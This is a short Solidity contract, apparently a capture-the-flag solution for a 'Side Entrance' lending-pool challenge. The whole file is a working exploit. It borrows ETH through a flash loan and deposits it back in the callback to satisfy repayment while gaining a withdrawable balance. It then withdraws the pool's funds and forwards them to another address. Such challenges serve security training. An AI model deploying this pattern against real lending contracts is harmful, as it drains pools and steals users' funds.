// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "../side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "lib/solady/src/utils/SafeTransferLib.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address recovery;
    uint256 amount;

    constructor(SideEntranceLenderPool pool_, address recovery_, uint256 amount_) {
        pool = pool_;
        recovery = recovery_;
        amount = amount_;
    }

    function attack() external {
        pool.flashLoan(amount);
        pool.withdraw();

        SafeTransferLib.safeTransferETH(recovery, amount);
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}